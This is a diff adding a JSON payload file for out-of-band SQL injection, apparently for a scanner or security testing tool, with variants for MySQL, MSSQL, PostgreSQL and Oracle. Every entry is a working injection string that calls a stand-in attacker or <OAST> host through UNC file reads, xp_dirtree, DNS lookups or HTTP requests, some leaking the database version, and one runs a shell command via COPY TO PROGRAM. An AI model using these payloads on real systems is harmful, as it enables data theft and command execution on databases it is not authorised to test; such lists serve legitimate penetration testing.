@@ -1,0 +1,15 @@
+{
+  "variants": {
+    "mysql": ["' UNION SELECT LOAD_FILE('\\\\\\\\attacker\\\\share\\\\test')-- -", "1' INTO OUTFILE '\\\\\\\\attacker\\\\share\\\\test'-- -", "' UNION SELECT * FROM (SELECT LOAD_FILE('\\\\\\\\<OAST>\\\\share'))a-- -", "1; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.<OAST>\\\\a'))-- -"],
+    "mssql": ["'; EXEC master..xp_dirtree '\\\\\\\\<OAST>\\\\share'-- -", "'; EXEC master..xp_fileexist '\\\\\\\\<OAST>\\\\share'-- -", "'; DECLARE @q varchar(99); SET @q='\\\\\\\\<OAST>\\\\'+@@version; EXEC master..xp_dirtree @q-- -", "1; EXEC master..xp_subdirs '\\\\\\\\<OAST>\\\\test'-- -"],
+    "postgresql": ["'; COPY (SELECT '') TO PROGRAM('nslookup <OAST>')-- -", "'; CREATE TABLE x(a text); COPY x FROM '\\\\\\\\<OAST>\\\\share';-- -", "' UNION SELECT * FROM dblink('host=<OAST> user=a','SELECT 1')-- -"],
+    "oracle": ["' UNION SELECT UTL_HTTP.REQUEST('http://<OAST>/test') FROM dual-- -", "' UNION SELECT UTL_INADDR.GET_HOST_NAME('<OAST>.test') FROM dual-- -", "' UNION SELECT HTTPURITYPE('http://<OAST>/').GETCLOB() FROM dual-- -"]
+  },
+  "payloads": ["'; EXEC master..xp_dirtree '\\\\\\\\<OAST>\\\\share'-- -", "' UNION SELECT LOAD_FILE('\\\\\\\\<OAST>\\\\share')-- -", "'; COPY (SELECT '') TO PROGRAM('nslookup <OAST>')-- -"],
+  "markers": [],
+  "metadata": {
+    "cwe": "CWE-89",
+    "technique": "Out-of-band SQL injection",
+    "oast_placeholder": "<OAST>"
+  }
+}
